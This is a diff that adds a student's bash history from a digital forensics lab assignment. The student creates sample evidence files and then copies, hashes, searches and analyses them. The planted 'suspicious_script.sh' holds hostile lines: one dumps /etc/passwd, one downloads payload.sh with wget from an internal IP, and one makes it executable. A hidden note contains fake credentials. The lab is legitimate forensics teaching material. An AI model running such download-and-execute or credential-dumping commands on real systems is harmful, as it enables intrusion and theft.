@@ -1,0 +1,142 @@
+    1  pwd
+    2  mkdir DF_Lab_Assignment_2
+    3  cd DF_Lab_Assignment_2
+    4  mkdir evidence working_copy extracted logs report
+    5  ls
+    6  ls -R
+    7  cd evidence
+    8  pwd
+    9  cd ../working_copy
+   10  pwd
+   11  cd /home/user/PDF/DF_Lab_Assignment_2/logs
+   12  pwd
+   13  cd ..
+   14  ls -R > directory_structure.txt
+   15  cat directory_structure.txt
+   16  cd evidence
+   17  touch system_log.txt login_records.txt user_notes.txt suspicious_script.sh .hidden_note.txt
+   18  echo 'Sep 28 08:01:12 server sshd[1021]: Accepted password for admin from 192.168.1.10 port 51122' >> system_log.txt
+   19  echo 'Sep 28 08:05:44 server sshd[1033]: Failed password for root from 10.0.0.45 port 40222' >> system_log.txt
+   20  echo 'Sep 28 08:05:51 server sshd[1033]: Failed password for root from 10.0.0.45 port 40222' >> system_log.txt
+   21  echo 'Sep 28 08:06:03 server sshd[1033]: Failed password for root from 10.0.0.45 port 40224' >> system_log.txt
+   22  echo 'Sep 28 08:20:17 server kernel: error: disk sda2 write failed, retrying' >> system_log.txt
+   23  echo 'Sep 28 09:12:40 server sudo: john : user NOT in sudoers ; COMMAND=/bin/cat /etc/shadow' >> system_log.txt
+   24  echo 'Sep 28 09:30:02 server cron[2210]: (root) CMD (/usr/bin/backup.sh)' >> system_log.txt
+   25  echo 'Sep 28 10:45:31 server sshd[1188]: Unauthorized access attempt from 172.16.5.9' >> system_log.txt
+   26  echo 'Sep 28 11:02:09 server login: session opened for user guest' >> system_log.txt
+   27  echo 'Sep 28 11:15:55 server systemd[1]: Started Daily apt download activities' >> system_log.txt
+   28  echo 'Sep 28 12:00:00 server sshd[1290]: Accepted password for john from 192.168.1.25 port 50111' >> system_log.txt
+   29  echo 'Sep 28 12:40:18 server httpd[900]: ERROR 500 on /admin/upload.php' >> system_log.txt
+   30  echo 'admin,192.168.1.10,2025-09-28,08:01,success' >> login_records.txt
+   31  echo 'root,10.0.0.45,2025-09-28,08:05,failed' >> login_records.txt
+   32  echo 'root,10.0.0.45,2025-09-28,08:05,failed' >> login_records.txt
+   33  echo 'root,10.0.0.45,2025-09-28,08:06,failed' >> login_records.txt
+   34  echo 'john,192.168.1.25,2025-09-28,12:00,success' >> login_records.txt
+   35  echo 'guest,172.16.5.9,2025-09-28,10:45,unauthorized' >> login_records.txt
+   36  echo 'guest,172.16.5.9,2025-09-28,10:45,unauthorized' >> login_records.txt
+   37  echo 'alice,192.168.1.30,2025-09-28,09:15,success' >> login_records.txt
+   38  echo 'admin,192.168.1.10,2025-09-28,14:22,success' >> login_records.txt
+   39  echo 'john,192.168.1.25,2025-09-28,13:10,failed' >> login_records.txt
+   40  echo 'Meeting with vendor on friday, need to change the admin password soon.' >> user_notes.txt
+   41  echo 'Do not share the server ip 192.168.1.10 with anyone.' >> user_notes.txt
+   42  echo 'Backup script runs at 9:30 every day as root.' >> user_notes.txt
+   43  echo 'Ask john about the files he copied from /etc/shadow.' >> user_notes.txt
+   44  echo '#!/bin/bash' >> suspicious_script.sh
+   45  echo 'password=admin123' >> suspicious_script.sh
+   46  echo 'cat /etc/passwd > /tmp/pw_dump.txt' >> suspicious_script.sh
+   47  echo 'wget http://172.16.5.9/payload.sh -O /tmp/payload.sh' >> suspicious_script.sh
+   48  echo 'chmod +x /tmp/payload.sh' >> suspicious_script.sh
+   49  echo 'echo "done" >> /tmp/.status' >> suspicious_script.sh
+   50  echo 'secret key: 7f3a9c1e (do not delete)' >> .hidden_note.txt
+   51  echo 'temporary ftp login user=backup pass=Backup@2025' >> .hidden_note.txt
+   52  ls -la
+   53  cd ..
+   54  cp evidence/system_log.txt evidence/login_records.txt evidence/user_notes.txt evidence/suspicious_script.sh evidence/.hidden_note.txt working_copy/
+   55  ls -la working_copy
+   56  mv working_copy/user_notes.txt working_copy/examined_notes.txt
+   57  ls -la working_copy
+   58  diff evidence/system_log.txt working_copy/system_log.txt && echo 'system_log.txt is same'
+   59  diff evidence/login_records.txt working_copy/login_records.txt && echo 'login_records.txt is same'
+   60  diff evidence/user_notes.txt working_copy/examined_notes.txt && echo 'user_notes.txt and examined_notes.txt are same'
+   61  diff evidence/suspicious_script.sh working_copy/suspicious_script.sh && echo 'suspicious_script.sh is same'
+   62  diff evidence/.hidden_note.txt working_copy/.hidden_note.txt && echo '.hidden_note.txt is same'
+   63  echo '===== ls -lh =====' > logs/file_metadata.txt
+   64  ls -lhA evidence >> logs/file_metadata.txt
+   65  echo '===== file =====' >> logs/file_metadata.txt
+   66  file evidence/* evidence/.hidden_note.txt >> logs/file_metadata.txt
+   67  echo '===== stat =====' >> logs/file_metadata.txt
+   68  stat evidence/* evidence/.hidden_note.txt >> logs/file_metadata.txt
+   69  cat logs/file_metadata.txt
+   70  cd working_copy
+   71  ls -l suspicious_script.sh
+   72  stat -c '%A  %a  owner=%U  group=%G  %n' suspicious_script.sh
+   73  chmod u+x suspicious_script.sh
+   74  chmod go-w suspicious_script.sh
+   75  ls -l suspicious_script.sh
+   76  stat -c '%A  %a  owner=%U  group=%G  %n' suspicious_script.sh
+   77  cd ..
+   78  echo '===== all .txt files =====' > logs/file_search_results.txt
+   79  find . -name '*.txt' >> logs/file_search_results.txt
+   80  echo '===== all .sh files =====' >> logs/file_search_results.txt
+   81  find . -name '*.sh' >> logs/file_search_results.txt
+   82  echo '===== hidden files =====' >> logs/file_search_results.txt
+   83  find . -type f -name '.*' >> logs/file_search_results.txt
+   84  echo '===== files containing the word password =====' >> logs/file_search_results.txt
+   85  grep -rli password evidence working_copy >> logs/file_search_results.txt
+   86  echo '===== files modified in the last 24 hours =====' >> logs/file_search_results.txt
+   87  find . -type f -mtime -1 >> logs/file_search_results.txt
+   88  echo '===== files larger than 300 bytes =====' >> logs/file_search_results.txt
+   89  find . -type f -size +300c >> logs/file_search_results.txt
+   90  echo '===== files with executable permission =====' >> logs/file_search_results.txt
+   91  find . -type f -perm -u+x >> logs/file_search_results.txt
+   92  cat logs/file_search_results.txt
+   93  cd working_copy
+   94  cat system_log.txt
+   95  cat login_records.txt
+   96  head -5 system_log.txt
+   97  head -5 login_records.txt
+   98  tail -5 system_log.txt
+   99  tail -5 login_records.txt
+  100  wc -l -w -m system_log.txt login_records.txt
+  101  for k in failed error unauthorized login root; do echo "--- $k ---"; grep $k system_log.txt login_records.txt; done
+  102  for k in failed error unauthorized login root; do echo "--- $k (ignore case) ---"; grep -i $k system_log.txt login_records.txt; done
+  103  for k in failed error unauthorized login root; do echo "--- $k (line numbers) ---"; grep -in $k system_log.txt login_records.txt; done
+  104  grep -inE 'failed|error|unauthorized|login|root' system_log.txt login_records.txt > ../extracted/suspicious_entries.txt
+  105  cat ../extracted/suspicious_entries.txt
+  106  cd ..
+  107  sort working_copy/login_records.txt
+  108  sort working_copy/login_records.txt | uniq
+  109  sort working_copy/login_records.txt | uniq -c
+  110  sort working_copy/login_records.txt | uniq -d
+  111  cut -d, -f1,2,5 working_copy/login_records.txt
+  112  sort -t, -k1,1 working_copy/login_records.txt
+  113  echo '===== sorted alphabetically =====' > extracted/processed_login_records.txt
+  114  sort working_copy/login_records.txt >> extracted/processed_login_records.txt
+  115  echo '===== unique records =====' >> extracted/processed_login_records.txt
+  116  sort working_copy/login_records.txt | uniq >> extracted/processed_login_records.txt
+  117  echo '===== count of each record (repeated entries have count > 1) =====' >> extracted/processed_login_records.txt
+  118  sort working_copy/login_records.txt | uniq -c >> extracted/processed_login_records.txt
+  119  echo '===== fields: user, ip, status =====' >> extracted/processed_login_records.txt
+  120  cut -d, -f1,2,5 working_copy/login_records.txt >> extracted/processed_login_records.txt
+  121  echo '===== records arranged by user (field 1) =====' >> extracted/processed_login_records.txt
+  122  sort -t, -k1,1 working_copy/login_records.txt >> extracted/processed_login_records.txt
+  123  cat extracted/processed_login_records.txt
+  124  cd evidence
+  125  md5sum * .hidden_note.txt
+  126  sha256sum * .hidden_note.txt
+  127  echo '===== MD5 =====' > ../logs/original_hashes.txt
+  128  md5sum * .hidden_note.txt >> ../logs/original_hashes.txt
+  129  echo '===== SHA-256 =====' >> ../logs/original_hashes.txt
+  130  sha256sum * .hidden_note.txt >> ../logs/original_hashes.txt
+  131  cat ../logs/original_hashes.txt
+  132  cd ../working_copy
+  133  sha256sum * .hidden_note.txt > ../logs/working_copy_hashes.txt
+  134  cat ../logs/working_copy_hashes.txt
+  135  cd ..
+  136  diff <(cd evidence; sha256sum * .hidden_note.txt | sort -k2) <(cd working_copy; sha256sum * .hidden_note.txt | sed 's/examined_notes.txt/user_notes.txt/' | sort -k2) && echo 'all sha256 hashes match, copies are identical'
+  137  echo 'Sep 30 10:15:00 server sshd[9999]: extra line added to the working copy' >> working_copy/system_log.txt
+  138  sha256sum evidence/system_log.txt working_copy/system_log.txt
+  139  sha256sum working_copy/system_log.txt > logs/modified_copy_hash.txt
+  140  cat logs/modified_copy_hash.txt
+  141  history
+  142  history > logs/command_history.txt
